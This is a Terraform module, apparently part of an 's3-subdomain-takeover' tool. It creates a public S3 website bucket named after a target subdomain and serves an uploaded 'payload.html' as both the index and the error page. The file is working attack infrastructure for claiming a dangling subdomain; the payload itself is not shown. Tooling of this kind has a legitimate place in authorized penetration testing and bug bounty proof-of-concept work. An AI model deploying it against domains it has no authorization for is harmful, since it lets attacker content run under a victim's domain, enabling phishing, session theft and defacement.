resource "aws_s3_bucket" "this" {
  bucket = var.subdomain
  acl    = "public-read"

  policy = <<EOF
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Sid": "PublicReadGetObject",
            "Effect": "Allow",
            "Principal": "*",
            "Action": "s3:GetObject",
            "Resource": "arn:aws:s3:::${var.subdomain}/*"
        }
    ]
}
EOF

  website {
    index_document = "payload.html"
    error_document = "payload.html"
  }
}

resource "aws_s3_bucket_object" "this" {
  bucket       = var.subdomain
  key          = "payload.html"
  source       = ".terraform/modules/s3-subdomain-takeover/payload.html"
  content_type = "text/html"

  depends_on = [aws_s3_bucket.this]
}
